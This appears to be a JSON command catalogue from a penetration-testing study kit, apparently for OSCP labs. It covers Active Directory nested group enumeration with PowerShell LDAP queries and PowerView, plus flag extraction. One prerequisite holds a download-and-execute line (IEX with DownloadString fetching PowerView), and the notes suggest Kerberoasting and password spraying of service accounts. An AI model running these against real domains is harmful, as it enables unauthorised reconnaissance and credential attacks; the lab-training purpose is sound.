@@ -1,0 +1,628 @@
+{
+  "category": "enumeration",
+  "description": "Active Directory nested group enumeration using PowerShell - recursive group member discovery, manual .NET queries, and PowerView integration",
+  "commands": [
+    {
+      "id": "ps-get-group-members-basic",
+      "name": "Get Group Members - Basic LDAP Query (PowerShell)",
+      "category": "enumeration",
+      "command": "$groupResult = LDAPSearch -LDAPQuery \"(&(objectCategory=group)(name=<GROUP_NAME>))\"; $group = $groupResult[0]; $group.Properties.member",
+      "description": "Query AD group to get direct members (Distinguished Names) - first step in nested group enumeration",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "POWERSHELL",
+        "GROUPS",
+        "LDAP",
+        ".NET",
+        "OSCP:HIGH"
+      ],
+      "variables": [
+        {
+          "name": "<GROUP_NAME>",
+          "description": "AD group name to query (e.g., 'Domain Admins', 'Service Personnel')",
+          "example": "Domain Admins",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "(&(objectCategory=group)(name=...))": "LDAP filter: AND operator (&) requires BOTH conditions - object must be a group AND name must match",
+        ".Properties.member": "The 'member' attribute contains Distinguished Names (DNs) of all direct group members"
+      },
+      "success_indicators": [
+        "CN=",
+        "DC=",
+        "Distinguished Names displayed"
+      ],
+      "failure_indicators": [
+        "Function 'LDAPSearch' is not recognized",
+        "Index operation failed",
+        "No results found"
+      ],
+      "next_steps": [
+        "ps-nested-group-check-member-type",
+        "For each member DN, query by distinguishedName to determine if it's a user or nested group",
+        "Build recursive function to traverse nested groups"
+      ],
+      "alternatives": [
+        "powerview-get-netgroupmember",
+        "net group \"<GROUP_NAME>\" /domain"
+      ],
+      "prerequisites": [
+        "ps-ldapsearch-function"
+      ],
+      "troubleshooting": {
+        "Function not recognized": "Create LDAPSearch function first using ps-ldapsearch-function command",
+        "Index operation failed": "Group not found or has no members. Verify group name with: LDAPSearch -LDAPQuery \"(objectCategory=group)\" | select -ExpandProperty Properties | select cn",
+        "No results": "Group name incorrect. Try wildcard: (&(objectCategory=group)(name=*<PARTIAL>*))"
+      },
+      "notes": "This is the foundation for nested group enumeration. The 'member' attribute returns Distinguished Names (format: CN=username,CN=Users,DC=corp,DC=com). Each DN needs to be queried individually to determine if it's a user (leaf node) or another group (requires recursion). Nested groups are common in enterprise AD - a group can contain other groups which contain users. OSCP: Look for groups with 'Service', 'IT', 'Admin' in names - often contain privileged accounts buried multiple levels deep. Time estimate: 5 seconds per query.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "ps-nested-group-check-member-type",
+      "name": "Check if Group Member is User or Group (PowerShell)",
+      "category": "enumeration",
+      "command": "$memberDN = \"<DISTINGUISHED_NAME>\"; $memberSearch = LDAPSearch -LDAPQuery \"(distinguishedName=$memberDN)\"; $member = $memberSearch[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains \"group\") { Write-Host \"[GROUP] $($member.Properties.name[0])\" -ForegroundColor Magenta } elseif ($objectClass -contains \"user\") { Write-Host \"[USER] $($member.Properties.name[0])\" -ForegroundColor Green }",
+      "description": "Query a group member by Distinguished Name to determine if it's a user (leaf) or nested group (requires recursion)",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "POWERSHELL",
+        "GROUPS",
+        "LDAP",
+        "OSCP:HIGH"
+      ],
+      "variables": [
+        {
+          "name": "<DISTINGUISHED_NAME>",
+          "description": "Full Distinguished Name from group.Properties.member (e.g., 'CN=jeff,CN=Users,DC=corp,DC=com')",
+          "example": "CN=Administrator,CN=Users,DC=corp,DC=com",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "(distinguishedName=...)": "LDAP filter querying by exact DN - the unique identifier for an AD object",
+        ".objectclass": "Array property containing object type hierarchy (e.g., ['top', 'person', 'user'] or ['top', 'group'])",
+        "-contains": "PowerShell array operator - checks if 'group' or 'user' exists anywhere in the objectClass array"
+      },
+      "success_indicators": [
+        "[GROUP]",
+        "[USER]",
+        "Name displayed with color coding"
+      ],
+      "failure_indicators": [
+        "Index operation failed",
+        "Cannot index into a null array",
+        "No results"
+      ],
+      "next_steps": [
+        "If [GROUP] appears → recursively enumerate that nested group using ps-get-group-members-basic",
+        "If [USER] appears → extract user details, check for flags in description/info attributes",
+        "ps-nested-group-recursive-function"
+      ],
+      "alternatives": [
+        "powerview-get-netgroupmember",
+        "Manual check: Look for 'CN=Users' or 'CN=Groups' in DN path"
+      ],
+      "prerequisites": [
+        "ps-ldapsearch-function",
+        "ps-get-group-members-basic"
+      ],
+      "troubleshooting": {
+        "Index operation failed": "DN not found. Verify DN exact match including all commas and spaces",
+        "Cannot index into null array": "Query returned no results. Check DN format and domain connectivity",
+        "No color output": "Run in PowerShell console (not ISE with old versions). Colors require ANSI support."
+      },
+      "notes": "The objectClass attribute is hierarchical - users have ['top', 'person', 'organizationalPerson', 'user'], groups have ['top', 'group']. Using '-contains' handles this hierarchy correctly. Distinguished Names must match exactly - even extra spaces cause query failures. OSCP: This logic determines whether to recurse (nested group) or record (user). In exams, you'll often find users 2-3 levels deep: 'Service Personnel' → 'IT Support' → 'Developers' → target user. Time estimate: 2 seconds per member.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "ps-nested-group-recursive-function",
+      "name": "Recursive Nested Group Enumeration Function (PowerShell)",
+      "category": "enumeration",
+      "command": "function Get-NestedGroupMember { param([string]$GroupName, [int]$Depth = 0); $indent = \"  \" * $Depth; Write-Host \"$indent[+] $GroupName\" -ForegroundColor Cyan; $groupResult = LDAPSearch -LDAPQuery \"(&(objectCategory=group)(name=$GroupName))\"; if ($groupResult.Count -eq 0) { return }; $group = $groupResult[0]; $members = $group.Properties.member; if ($members.Count -eq 0) { return }; foreach ($memberDN in $members) { $memberSearch = LDAPSearch -LDAPQuery \"(distinguishedName=$memberDN)\"; if ($memberSearch.Count -gt 0) { $member = $memberSearch[0]; $memberName = $member.Properties.name[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains \"group\") { Write-Host \"$indent  [GROUP] $memberName\" -ForegroundColor Magenta; Get-NestedGroupMember -GroupName $memberName -Depth ($Depth + 1) } elseif ($objectClass -contains \"user\") { Write-Host \"$indent  [USER] $memberName\" -ForegroundColor Green; $script:AllUsers += $member } } } }; $script:AllUsers = @(); Get-NestedGroupMember -GroupName \"<GROUP_NAME>\"",
+      "description": "Complete recursive function to enumerate all users in a group hierarchy - automatically traverses nested groups and collects users",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "POWERSHELL",
+        "GROUPS",
+        "LDAP",
+        "FUNCTION",
+        "RECURSIVE",
+        "OSCP:HIGH",
+        "STARTER"
+      ],
+      "variables": [
+        {
+          "name": "<GROUP_NAME>",
+          "description": "Top-level group name to start enumeration (e.g., 'Service Personnel', 'Domain Admins')",
+          "example": "Service Personnel",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "param([string]$GroupName, [int]$Depth = 0)": "Function parameters - GroupName is required, Depth tracks recursion level (default 0 for top-level)",
+        "$indent = \"  \" * $Depth": "Creates indentation string (2 spaces × depth) for tree visualization",
+        "$script:AllUsers += $member": "Script-scoped array - persists across recursive calls to collect all discovered users",
+        "Get-NestedGroupMember -GroupName $memberName -Depth ($Depth + 1)": "Recursive call - increments depth and processes nested group"
+      },
+      "success_indicators": [
+        "[+]",
+        "[GROUP]",
+        "[USER]",
+        "Hierarchical tree output",
+        "Indentation showing nesting levels"
+      ],
+      "failure_indicators": [
+        "Function not recognized",
+        "Maximum recursion depth exceeded",
+        "Infinite loop"
+      ],
+      "next_steps": [
+        "Access collected users: $script:AllUsers | foreach { $_.Properties.samaccountname }",
+        "Get last user details: $script:AllUsers[-1]",
+        "ps-get-last-nested-user",
+        "Extract flags from user attributes: $script:AllUsers[-1].Properties.description"
+      ],
+      "alternatives": [
+        "powerview-get-netgroupmember",
+        "Manual iteration without recursion"
+      ],
+      "prerequisites": [
+        "ps-ldapsearch-function"
+      ],
+      "troubleshooting": {
+        "Function not recognized": "LDAPSearch function required. Create using ps-ldapsearch-function first",
+        "Maximum recursion depth": "Circular group membership detected. PowerShell default limit is 100 levels. Add visited group tracking to prevent loops.",
+        "AllUsers array empty": "No users found. Check group name and verify group has members: LDAPSearch -LDAPQuery \"(&(objectCategory=group)(name=<GROUP>))\" | select -ExpandProperty Properties | select cn,member"
+      },
+      "notes": "This function implements depth-first traversal of the group hierarchy. The $Depth parameter creates visual tree output - easier to understand nesting levels during enumeration. $script:AllUsers uses script scope (not global) to avoid polluting global namespace while remaining accessible across recursive calls. Tree output format: Top-level group (no indent) → Level 1 groups (2 spaces) → Level 2 groups (4 spaces) → Users (indented at their level). OSCP: This is the complete solution for 'unravel nested groups' lab questions. Copy-paste this entire function, then call with target group name. Typical exam scenario: 3 levels deep, 5-10 total users. Time estimate: 10-15 seconds for complete enumeration.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "ps-get-last-nested-user",
+      "name": "Get Last User from Nested Group Enumeration (PowerShell)",
+      "category": "enumeration",
+      "command": "if ($script:AllUsers.Count -gt 0) { $lastUser = $script:AllUsers[-1]; Write-Host \"`n[+] LAST USER: $($lastUser.Properties.samaccountname[0])\" -ForegroundColor Yellow; foreach ($prop in $lastUser.Properties.PropertyNames) { Write-Host \"$prop : $($lastUser.Properties[$prop])\" -ForegroundColor White } } else { Write-Host \"[-] No users found\" -ForegroundColor Red }",
+      "description": "Display all attributes of the last user found in nested group enumeration - useful for finding flags in OSCP labs",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "POWERSHELL",
+        "USERS",
+        "FLAG_EXTRACTION",
+        "OSCP:HIGH",
+        "QUICK_WIN"
+      ],
+      "variables": [],
+      "flag_explanations": {
+        "$script:AllUsers[-1]": "Array index -1 gets the LAST element - the final user added during nested group recursion",
+        "$lastUser.Properties.PropertyNames": "Collection of all AD attribute names for this user object",
+        "foreach ($prop in ...)": "Iterates through every single attribute to display complete user profile"
+      },
+      "success_indicators": [
+        "LAST USER:",
+        "samaccountname",
+        "description",
+        "info",
+        "Multiple attributes displayed"
+      ],
+      "failure_indicators": [
+        "No users found",
+        "AllUsers variable not defined",
+        "Index was outside the bounds"
+      ],
+      "next_steps": [
+        "Search output for flag: Look in 'description', 'info', 'comment', 'adminDescription' fields",
+        "Check for Base64 encoded flags",
+        "Document findings in enumeration.md"
+      ],
+      "alternatives": [
+        "powerview-get-netuser",
+        "Manual attribute inspection: $script:AllUsers[-1].Properties | select description,info,comment"
+      ],
+      "prerequisites": [
+        "ps-nested-group-recursive-function"
+      ],
+      "troubleshooting": {
+        "AllUsers variable not defined": "Run ps-nested-group-recursive-function first to populate the array",
+        "No users found": "Group has no user members or only contains nested groups. Check group membership manually.",
+        "Index out of bounds": "$script:AllUsers is empty. Verify group enumeration completed successfully."
+      },
+      "notes": "OSCP lab pattern: Questions ask to 'enumerate nested groups and find the last user' then extract a flag from that user's attributes. Common flag locations: 'description' (most common), 'info', 'comment', 'userParameters' (rare). Flags usually in format: flag{...}, OS{...}, or plaintext hints. Sometimes Base64 encoded. The 'last user' refers to the last DIRECT user member discovered during depth-first traversal - not necessarily the last alphabetically. Time estimate: Instant after enumeration completes.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "ps-find-new-domain-admin",
+      "name": "Find New Domain Admin User (PowerShell)",
+      "category": "enumeration",
+      "command": "LDAPSearch -LDAPQuery \"(&(objectCategory=group)(name=Domain Admins))\" | ForEach-Object { $_.Properties.member } | ForEach-Object { $memberDN = $_; $userSearch = LDAPSearch -LDAPQuery \"(distinguishedName=$memberDN)\"; $user = $userSearch[0]; [PSCustomObject]@{ Name = $user.Properties.samaccountname[0]; Created = $user.Properties.whencreated[0]; DN = $memberDN } } | Sort-Object Created | Format-Table -AutoSize",
+      "description": "List all Domain Admins members with creation dates sorted chronologically - identify recently added admin accounts",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "POWERSHELL",
+        "DOMAIN_ADMINS",
+        "LDAP",
+        "OSCP:HIGH",
+        "STARTER"
+      ],
+      "variables": [],
+      "flag_explanations": {
+        "whencreated": "AD attribute containing account creation timestamp (UTC format)",
+        "Sort-Object Created": "Sorts results by creation date - oldest first, newest last",
+        "[PSCustomObject]@{...}": "Creates custom object with selected properties for clean output",
+        "Format-Table -AutoSize": "Displays results in columnar format with automatic column width"
+      },
+      "success_indicators": [
+        "Name",
+        "Created",
+        "Table with timestamps",
+        "Multiple Domain Admin accounts listed"
+      ],
+      "failure_indicators": [
+        "Function not recognized",
+        "Cannot index into null array",
+        "No results"
+      ],
+      "next_steps": [
+        "Identify the NEWEST account (bottom of sorted list)",
+        "Verify it's not built-in: Built-in accounts (Administrator, krbtgt) have older creation dates",
+        "Get full details: LDAPSearch -LDAPQuery \"(samAccountName=<NEW_ADMIN>)\" | select -ExpandProperty Properties"
+      ],
+      "alternatives": [
+        "powerview-get-netgroupmember",
+        "net group \"Domain Admins\" /domain",
+        "Get-ADGroupMember -Identity \"Domain Admins\" | Get-ADUser -Properties whencreated | Sort-Object whencreated"
+      ],
+      "prerequisites": [
+        "ps-ldapsearch-function"
+      ],
+      "troubleshooting": {
+        "Cannot index into null array": "User object query failed. Check DN format and domain connectivity",
+        "Empty Created column": "User object missing whencreated attribute. Try whenChanged instead",
+        "No results": "Domain Admins group empty or you lack read permissions"
+      },
+      "notes": "Built-in Domain Admin accounts (Administrator) typically have creation dates matching domain creation (often years old). Newly added admins have recent timestamps (days/weeks old). OSCP lab pattern: Question asks 'which NEW user is part of Domain Admins' - answer is the account with the most recent whencreated date. Exclude built-in accounts by name: Administrator, krbtgt, Guest. Time estimate: 10 seconds. Alternative approach: Filter by whencreated > recent date to exclude legacy accounts.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "powerview-get-domaingroup-recursive",
+      "name": "PowerView - Get Group Members Recursively (PowerView 3.0+)",
+      "category": "enumeration",
+      "command": "Get-DomainGroupMember -Identity \"<GROUP_NAME>\" -Recurse",
+      "description": "PowerView command to enumerate group members including all nested groups automatically",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "POWERSHELL",
+        "POWERVIEW",
+        "GROUPS",
+        "OSCP:HIGH",
+        "QUICK_WIN"
+      ],
+      "variables": [
+        {
+          "name": "<GROUP_NAME>",
+          "description": "AD group name (e.g., 'Domain Admins', 'Service Personnel')",
+          "example": "Domain Admins",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "-Identity": "PowerView 3.0+ parameter - accepts group name, DN, SID, or GUID (replaces old -GroupName parameter)",
+        "-Recurse": "Automatically unfurls nested groups and returns all users at all levels flattened"
+      },
+      "success_indicators": [
+        "MemberName",
+        "MemberObjectClass",
+        "MemberDistinguishedName",
+        "GroupName"
+      ],
+      "failure_indicators": [
+        "Get-DomainGroupMember : The term 'Get-DomainGroupMember' is not recognized",
+        "A parameter cannot be found that matches parameter name 'Identity'",
+        "Group not found"
+      ],
+      "next_steps": [
+        "Filter users only: Get-DomainGroupMember -Identity \"<GROUP_NAME>\" -Recurse | Where-Object { $_.MemberObjectClass -eq \"user\" }",
+        "Get last user: ($members | Where-Object { $_.MemberObjectClass -eq \"user\" })[-1]",
+        "Get user details: Get-DomainUser -Identity <USERNAME>",
+        "ps-powerview-get-user-details"
+      ],
+      "alternatives": [
+        "ps-nested-group-recursive-function",
+        "net group \"<GROUP_NAME>\" /domain"
+      ],
+      "prerequisites": [
+        "PowerView imported: Import-Module .\\PowerView.ps1 or IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')"
+      ],
+      "troubleshooting": {
+        "Term not recognized": "PowerView not imported. Load with: Import-Module .\\PowerView.ps1",
+        "Parameter 'Identity' not found": "You have PowerView 2.0 (old). Use: Get-NetGroupMember -GroupName \"<GROUP>\" instead",
+        "Group not found": "Verify group name: Get-DomainGroup | Select-Object name | Where-Object { $_.name -like \"*<PARTIAL>*\" }"
+      },
+      "notes": "PowerView 3.0+ changed parameter names: -GroupName became -Identity. This is the fastest method for nested group enumeration IF PowerView is available. Without -Recurse, only shows direct members (one level). With -Recurse, flattens entire hierarchy into single list. Output includes MemberObjectClass to distinguish users from groups. OSCP: PowerView may be blocked by AV or unavailable - always know the manual .NET method as backup (ps-nested-group-recursive-function). Time estimate: 3-5 seconds.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "ps-powerview-get-user-details",
+      "name": "PowerView - Get User Full Attributes",
+      "category": "enumeration",
+      "command": "Get-DomainUser -Identity \"<USERNAME>\" | Format-List *",
+      "description": "Retrieve all AD attributes for a specific user - useful for flag extraction after nested group enumeration",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "POWERSHELL",
+        "POWERVIEW",
+        "USERS",
+        "FLAG_EXTRACTION",
+        "OSCP:HIGH"
+      ],
+      "variables": [
+        {
+          "name": "<USERNAME>",
+          "description": "SAM account name (login username) or Distinguished Name",
+          "example": "jeff_admin",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "-Identity": "Accepts samAccountName, DN, SID, or GUID",
+        "Format-List *": "PowerShell cmdlet to display ALL properties in list format (one per line) - asterisk means all properties"
+      },
+      "success_indicators": [
+        "samaccountname",
+        "description",
+        "info",
+        "memberof",
+        "whencreated",
+        "pwdlastset"
+      ],
+      "failure_indicators": [
+        "Get-DomainUser : The term 'Get-DomainUser' is not recognized",
+        "User not found",
+        "No results"
+      ],
+      "next_steps": [
+        "Search output for flags in: description, info, comment, adminDescription, userParameters",
+        "Check group membership: .memberof property",
+        "Check password age: pwdlastset attribute"
+      ],
+      "alternatives": [
+        "ps-get-last-nested-user",
+        "LDAPSearch -LDAPQuery \"(samAccountName=<USERNAME>)\"",
+        "Get-ADUser -Identity <USERNAME> -Properties *"
+      ],
+      "prerequisites": [
+        "PowerView imported"
+      ],
+      "troubleshooting": {
+        "Term not recognized": "Import PowerView first",
+        "User not found": "Verify username: Get-DomainUser | Select-Object samaccountname | Where-Object { $_.samaccountname -like \"*<PARTIAL>*\" }"
+      },
+      "notes": "Format-List * displays 80+ attributes including: description (common flag location), info (secondary flag location), memberof (all group memberships), whencreated (account age), pwdlastset (password age), userAccountControl (account flags), adminCount (privilege indicator), servicePrincipalName (Kerberoasting target). OSCP: After nested group enumeration identifies target user, use this to get full details and extract flags. Time estimate: 2 seconds.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "ps-powerview-find-service-accounts",
+      "name": "PowerView - Find Service Accounts in Groups",
+      "category": "enumeration",
+      "command": "Get-DomainGroupMember -Identity \"<GROUP_NAME>\" -Recurse | Where-Object { $_.MemberObjectClass -eq \"user\" -and $_.MemberName -like \"*svc*\" }",
+      "description": "Find service accounts buried in nested groups - service accounts often have weak passwords and high privileges",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "POWERSHELL",
+        "POWERVIEW",
+        "SERVICE_ACCOUNTS",
+        "GROUPS",
+        "OSCP:HIGH",
+        "QUICK_WIN"
+      ],
+      "variables": [
+        {
+          "name": "<GROUP_NAME>",
+          "description": "Group name to search (e.g., 'Service Personnel', 'IT Support')",
+          "example": "Service Personnel",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "$_.MemberObjectClass -eq \"user\"": "Filters to only user objects (exclude nested groups)",
+        "$_.MemberName -like \"*svc*\"": "PowerShell wildcard match - finds accounts with 'svc' anywhere in the name",
+        "-and": "Logical AND - both conditions must be true"
+      },
+      "success_indicators": [
+        "MemberName",
+        "Accounts with 'svc' in name",
+        "Service account usernames"
+      ],
+      "failure_indicators": [
+        "PowerView not loaded",
+        "No results",
+        "Group not found"
+      ],
+      "next_steps": [
+        "Check for SPNs: Get-DomainUser -Identity <SVC_ACCOUNT> | Select-Object samaccountname,serviceprincipalname",
+        "Test Kerberoasting: Get-DomainUser -SPN | Where-Object { $_.samaccountname -like \"*svc*\" }",
+        "Password spray service accounts (weak passwords common)"
+      ],
+      "alternatives": [
+        "Manual filter: LDAPSearch -LDAPQuery \"(&(objectCategory=user)(samAccountName=*svc*))\"",
+        "Search patterns: *sql*, *backup*, *service*, *admin*"
+      ],
+      "prerequisites": [
+        "PowerView imported"
+      ],
+      "troubleshooting": {
+        "No results": "Try broader patterns: *sql*, *admin*, *backup*, *sa* (SQL Server default admin)"
+      },
+      "notes": "Service account naming patterns: svc_*, *svc*, sql_*, *sql*, backup_*, *backup*, sa (SQL Server admin). Service accounts characteristics: Rarely have password changes (pwdlastset old), often have SPNs registered (Kerberoastable), frequently over-privileged (added to Domain Admins for convenience), descriptions often contain passwords/hints. OSCP: Service accounts are high-value targets - weak passwords common, often reused across multiple services. Time estimate: 5 seconds.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "ps-extract-flag-from-user",
+      "name": "Extract Flag from User Attributes (PowerShell)",
+      "category": "enumeration",
+      "command": "$user = LDAPSearch -LDAPQuery \"(samAccountName=<USERNAME>)\"; $user = $user[0]; Write-Host \"`n[+] Checking flag locations:\" -ForegroundColor Yellow; @('description','info','comment','adminDescription','userParameters') | ForEach-Object { $value = $user.Properties[$_][0]; if ($value) { Write-Host \"$_ : $value\" -ForegroundColor Cyan } }",
+      "description": "Check common flag storage locations in user AD attributes - targeted flag extraction for OSCP labs",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "POWERSHELL",
+        "FLAG_EXTRACTION",
+        "USERS",
+        "OSCP:HIGH",
+        "QUICK_WIN"
+      ],
+      "variables": [
+        {
+          "name": "<USERNAME>",
+          "description": "SAM account name of target user",
+          "example": "jeff_admin",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "@('description','info',...)": "PowerShell array literal - list of attribute names to check",
+        "| ForEach-Object": "Pipeline operator - runs code block for each attribute in array",
+        "$user.Properties[$_][0]": "$_ = current attribute name, [0] gets first value (attributes can be multi-valued)",
+        "if ($value)": "Only displays attributes that have values (skips empty attributes)"
+      },
+      "success_indicators": [
+        "description :",
+        "info :",
+        "Flag displayed",
+        "Attribute values shown"
+      ],
+      "failure_indicators": [
+        "User not found",
+        "All attributes empty",
+        "Cannot index into null array"
+      ],
+      "next_steps": [
+        "If flag is Base64: [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"<BASE64>\"))",
+        "Document in breakthrough.md",
+        "Check other users in same group for additional flags"
+      ],
+      "alternatives": [
+        "ps-get-last-nested-user",
+        "Get-DomainUser -Identity <USERNAME> | Select-Object description,info,comment"
+      ],
+      "prerequisites": [
+        "ps-ldapsearch-function"
+      ],
+      "troubleshooting": {
+        "All attributes empty": "Flags may be in less common attributes. Check all: $user.Properties.PropertyNames | ForEach-Object { \"$_ : $($user.Properties[$_])\" }",
+        "User not found": "Verify username spelling and case sensitivity"
+      },
+      "notes": "OSCP flag location frequency (observed pattern): description (70%), info (15%), comment (10%), adminDescription (3%), userParameters (2%). Flags formats: flag{...} (most common), OS{...} (OffSec format), plaintext hints, Base64 encoded strings. Rare locations: msDS-CloudExtensionAttribute1-10, extensionAttribute1-15, otherMailbox. OSCP lab pattern: 'Enumerate nested groups and extract flag from last user' - this command targets the exact attributes where flags are hidden. Time estimate: 2 seconds.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "ps-nested-group-one-liner",
+      "name": "Nested Group Enumeration - Complete One-Liner (PowerShell)",
+      "category": "enumeration",
+      "command": "function LDAPSearch { param([string]$LDAPQuery); $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DN = ([adsi]'').distinguishedName; $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$PDC/$DN\"); $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery); return $DirectorySearcher.FindAll() }; function Get-NestedGroupMember { param([string]$GroupName, [int]$Depth = 0); $indent = \"  \" * $Depth; Write-Host \"$indent[+] $GroupName\" -ForegroundColor Cyan; $groupResult = LDAPSearch -LDAPQuery \"(&(objectCategory=group)(name=$GroupName))\"; if ($groupResult.Count -eq 0) { return }; $group = $groupResult[0]; $members = $group.Properties.member; if ($members.Count -eq 0) { return }; foreach ($memberDN in $members) { $memberSearch = LDAPSearch -LDAPQuery \"(distinguishedName=$memberDN)\"; if ($memberSearch.Count -gt 0) { $member = $memberSearch[0]; $memberName = $member.Properties.name[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains \"group\") { Write-Host \"$indent  [GROUP] $memberName\" -ForegroundColor Magenta; Get-NestedGroupMember -GroupName $memberName -Depth ($Depth + 1) } elseif ($objectClass -contains \"user\") { Write-Host \"$indent  [USER] $memberName\" -ForegroundColor Green; $script:AllUsers += $member } } } }; $script:AllUsers = @(); Get-NestedGroupMember -GroupName \"<GROUP_NAME>\"; if ($script:AllUsers.Count -gt 0) { $lastUser = $script:AllUsers[-1]; Write-Host \"`n[+] LAST USER: $($lastUser.Properties.samaccountname[0])\" -ForegroundColor Yellow; Write-Host \"[+] FLAG LOCATIONS:\" -ForegroundColor Yellow; @('description','info','comment') | ForEach-Object { $value = $lastUser.Properties[$_][0]; if ($value) { Write-Host \"$_ : $value\" -ForegroundColor Cyan } } }",
+      "description": "Complete copy-paste solution for OSCP nested group labs - includes LDAPSearch function, recursive enumeration, and automatic flag extraction",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "POWERSHELL",
+        "GROUPS",
+        "FLAG_EXTRACTION",
+        "OSCP:HIGH",
+        "STARTER",
+        "QUICK_WIN"
+      ],
+      "variables": [
+        {
+          "name": "<GROUP_NAME>",
+          "description": "Top-level group name to enumerate",
+          "example": "Service Personnel",
+          "required": true
+        }
+      ],
+      "flag_explanations": {},
+      "success_indicators": [
+        "Hierarchical tree output",
+        "[+] LAST USER:",
+        "FLAG LOCATIONS:",
+        "description/info/comment values displayed"
+      ],
+      "failure_indicators": [
+        "Syntax error",
+        "Function already exists",
+        "No users found"
+      ],
+      "next_steps": [
+        "Copy flag value from output",
+        "Document enumeration process in enumeration.md",
+        "Create educational writeup for learning"
+      ],
+      "alternatives": [
+        "powerview-get-domaingroup-recursive",
+        "Split into separate commands: ps-ldapsearch-function + ps-nested-group-recursive-function + ps-get-last-nested-user"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "Function already exists": "Clear functions: Remove-Item Function:\\LDAPSearch; Remove-Item Function:\\Get-NestedGroupMember",
+        "Syntax error": "Copy entire command as single block. Do not split across multiple lines in terminal."
+      },
+      "notes": "This is the ULTIMATE OSCP nested group lab solution. Copy the entire command, replace <GROUP_NAME> with target group, execute. Output shows: 1) Tree structure of group hierarchy, 2) All users at all levels, 3) Last user details, 4) Flag attributes automatically extracted. No PowerView required. No separate function files. Single copy-paste execution. OSCP exam use case: When question says 'enumerate nested groups and find flag in last user', paste this command and you're done in 15 seconds. Time estimate: Complete enumeration + flag extraction in 15 seconds total.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "ps-compare-powerview-versions",
+      "name": "PowerView Version Compatibility Check",
+      "category": "enumeration",
+      "command": "Get-Command Get-NetGroupMember -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ParameterSets | Select-Object -First 1 | Select-Object -ExpandProperty Parameters | Select-Object Name | Where-Object { $_.Name -like \"*Group*\" -or $_.Name -like \"*Identity*\" }",
+      "description": "Detect PowerView version by checking parameter names - determines if you have version 2.0 (-GroupName) or 3.0+ (-Identity)",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "POWERSHELL",
+        "POWERVIEW",
+        "TROUBLESHOOTING",
+        "OSCP:MEDIUM"
+      ],
+      "variables": [],
+      "flag_explanations": {
+        "-ErrorAction SilentlyContinue": "Suppresses error if Get-NetGroupMember doesn't exist (PowerView not loaded)",
+        "Select-Object -ExpandProperty ParameterSets": "Gets all parameter sets for the command",
+        "Where-Object { $_.Name -like \"*Group*\" -or $_.Name -like \"*Identity*\" }": "Filters to show only relevant parameters"
+      },
+      "success_indicators": [
+        "GroupName",
+        "Identity",
+        "Parameter name displayed"
+      ],
+      "failure_indicators": [
+        "No output (PowerView not loaded)",
+        "Command not found"
+      ],
+      "next_steps": [
+        "If 'GroupName' appears → PowerView 2.0 → Use: Get-NetGroupMember -GroupName \"<GROUP>\"",
+        "If 'Identity' appears → PowerView 3.0+ → Use: Get-DomainGroupMember -Identity \"<GROUP>\"",
+        "No output → PowerView not loaded → Use manual .NET methods"
+      ],
+      "alternatives": [
+        "Quick test: Get-NetGroupMember -GroupName \"Domain Admins\" (if fails with 'parameter not found', you have 3.0+)",
+        "Check module path: (Get-Module PowerView).Path | Select-String -Pattern 'version'"
+      ],
+      "prerequisites": [
+        "PowerView imported (if checking version)"
+      ],
+      "troubleshooting": {
+        "No output": "PowerView not loaded. Import first: Import-Module .\\PowerView.ps1",
+        "Command errors": "Use simpler version check: Get-Command Get-*GroupMember"
+      },
+      "notes": "PowerView version history: Version 2.0 used specific parameters (-GroupName, -UserName, -ComputerName). Version 3.0+ standardized on -Identity for all commands. Common error: 'A parameter cannot be found that matches parameter name GroupName' means you're using v2.0 syntax on v3.0+ PowerView. OSCP: Most modern PowerView distributions are 3.0+, but older lab machines may have 2.0. Know both syntaxes. Time estimate: 5 seconds.",
+      "oscp_relevance": "medium"
+    }
+  ]
+}
